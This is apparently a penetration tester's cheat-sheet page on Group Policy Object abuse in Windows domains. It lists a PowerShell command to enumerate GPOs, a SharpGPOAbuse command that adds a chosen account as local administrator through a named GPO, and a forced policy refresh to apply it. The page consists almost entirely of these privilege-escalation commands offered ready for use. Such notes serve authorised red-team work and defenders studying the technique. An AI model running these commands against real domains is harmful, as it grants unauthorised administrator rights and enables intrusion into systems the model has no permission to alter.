---
title: "GPOs"
date: 2024-8-3
tags: ["GPOs", "Windows", "privesc", "Group Policy Objects"]
---

---
### GPO Abuse

[SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)

#### List GPOs Name

```powershell
Get-GPO -All | Select-Object DisplayName
```

#### Add localAdmin

```powershell
.\SharpGPOAbuse.exe --AddLocalADmin --UserAccount <USERNAME> --GPOName <GPO_NAME>
```

#### Force reload

```powershell
gpupdate /force
```

<br>